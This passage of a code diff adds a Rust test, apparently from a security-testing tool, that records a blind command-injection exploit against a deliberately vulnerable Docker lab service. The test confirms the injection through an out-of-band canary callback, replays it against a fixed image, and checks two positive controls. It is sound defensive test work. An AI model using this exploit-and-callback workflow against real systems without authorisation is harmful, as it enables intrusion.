+    /// (`CMDI_BENIGN_RENDERED`, not the banner) proving the fixed endpoint still RUNS
+    /// the command (not a dead `/exec`). The canary-only control the SSRF loop has
+    /// cannot catch the dead-endpoint case; the cmdi fixture can, so it does.
+    /// Mutation: revert the fixed `/exec` to the shell-concat -> the injected `curl`
+    /// runs again -> the canary records the token -> `on_fixed.value` is true -> this
+    /// fails; make the fixed `/exec` return a constant for every input -> the echoed
+    /// benign value is absent -> the benign-control assertion fails (the gap the
+    /// second control closes).
+    #[test]
+    fn blind_command_injection_fix_and_replay_closes_the_loop() {
+        if !linux_docker_available() {
+            eprintln!(
+                "skipping blind_command_injection_fix_and_replay_closes_the_loop: no Linux Docker daemon"
+            );
+            return;
+        }
+        for image in [
+            "redstep/cmdi:mvp",
+            "redstep/cmdi:fixed",
+            "redstep/canary:mvp",
+        ] {
+            if !image_present(image) {
+                eprintln!(
+                    "skipping blind_command_injection_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
+                );
+                return;
+            }
+        }
+        block_on(async {
+            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
+            let flat = |cmdi_image: &str| {
+                Environment::builder()
+                    .segment("lab")
+                    .vantage("lab")
+                    .service("cmdi", cmdi_image, "lab")
+                    .service("canary", "redstep/canary:mvp", "lab")
+                    .build()
+                    .expect("the cmdi+canary environment is valid")
+            };
+            let vuln_env = flat("redstep/cmdi:mvp");
+            let fixed_env = flat("redstep/cmdi:fixed");
+
+            // Record a genuine blind injection against the vulnerable lab and take ITS
+            // witness, so replaying round-trips the recorder's own output through
+            // `parse_blind_cmdi_witness`.
+            let vuln_lab = bring_up(&docker, &vuln_env)
+                .await
+                .expect("bring up the vulnerable cmdi+canary");
+            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
+            let vuln_scope = Scope::from_environment(&vuln_env);
+            let vuln_target = vuln_scope.resolve("cmdi:8083").expect("cmdi is in scope");
+            let vuln_canary = vuln_lab
+                .containers()
+                .iter()
+                .find(|c| c.workload() == "canary")
+                .map(|c| c.name().to_owned())
+                .expect("the canary container");
+            let (recorded_vuln, draft) = blind_cmdi_exploit_from(
+                &docker,
+                vuln_net,
+                &vuln_target,
+                SSRF_CANARY_ALIAS,
+                SSRF_CANARY_PORT,
+                &vuln_canary,
+                BLIND_CMDI_TOKEN,
+                Duration::from_millis(5_000),
+            )
+            .await
+            .expect("the recording blind cmdi ran");
+            vuln_lab
+                .teardown()
+                .await
+                .expect("teardown after recording the witness");
+            let witness = draft.reproduction;
+
+            let on_vuln = replay_blind_cmdi_probe(&docker, &vuln_env, &witness)
+                .await
+                .expect("replay against the vulnerable lab ran");
+            let on_fixed = replay_blind_cmdi_probe(&docker, &fixed_env, &witness)
+                .await
+                .expect("replay against the fixed lab ran");
+
+            // The fixed lab once more, for the two positive controls.
+            let fixed_lab = bring_up(&docker, &fixed_env)
+                .await
+                .expect("bring up the fixed cmdi+canary");
+            let net = fixed_lab
+                .networks()
+                .iter()
+                .find(|n| n.segment() == "lab")
+                .expect("the lab network")
+                .clone();
+            let scope = Scope::from_environment(&fixed_env);
+            let target = scope.resolve("cmdi:8083").expect("cmdi is in scope");
+            let fixed_canary = fixed_lab
+                .containers()
+                .iter()
+                .find(|c| c.workload() == "canary")
+                .map(|c| c.name().to_owned())
+                .expect("the canary container");
+
+            // Control 1 (canary live): a direct vantage->canary hit on the fixed lab
+            // is recorded, so "not seen" below is the fix holding, not a dead canary.
+            let control_url =
+                format!("http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{BLIND_CMDI_CONTROL_TOKEN}");
+            let _ = run_probe_capturing(
+                &docker,
+                net.name(),
+                wget_cmd(&control_url, 5, &[]),
+                Duration::from_secs(10),
+            )
+            .await
+            .expect("the direct canary probe ran");
+            let (canary_out, _) = read_container_logs(&docker, &fixed_canary)
+                .await
+                .expect("read the canary logs");
+
+            // Control 2 (/exec live): a benign /exec on the fixed lab still RUNS echo
+            // and returns the echoed input, so "not seen" is not a dead endpoint. The
+            // marker is the echoed benign value, NOT the banner, because the banner is
+            // prefixed to every response including an error body (RK-016).
+            let benign_url = format!(
+                "http://{}:{}/exec?cmd={CMDI_BENIGN}",
+                target.host(),
+                target.port()
+            );
+            let (_s, benign_body, _h) = run_probe_capturing(
+                &docker,
+                net.name(),
+                wget_cmd(&benign_url, 5, &[]),
+                Duration::from_secs(10),
+            )
+            .await
+            .expect("the benign /exec probe ran");
+            let _ = fixed_lab.teardown().await;
+
+            assert!(
+                recorded_vuln.value,
+                "the recording genuinely injects a command that reaches the canary"
+            );
+            assert!(
+                on_vuln.value,
+                "the witness replays as exploited against a fresh vulnerable lab"
+            );
+            assert!(
+                !on_fixed.value,
+                "the fix closes it: the same witness is not-exploitable against the fixed lab"
+            );
+            assert_eq!(
+                on_fixed.confidence,
+                Confidence::High,
+                "the fixed not-exploitable is a confident clean, not an abnormal Low"
+            );
+            assert!(
+                canary_out.contains(BLIND_CMDI_CONTROL_TOKEN),
+                "positive control 1: the canary still records a direct hit on the fixed lab"
+            );
+            assert!(
+                benign_body.contains(CMDI_BENIGN_RENDERED),
+                "positive control 2: the fixed /exec still RUNS echo (its output is returned), not a dead endpoint: {benign_body:?}"
             );
         });
     }
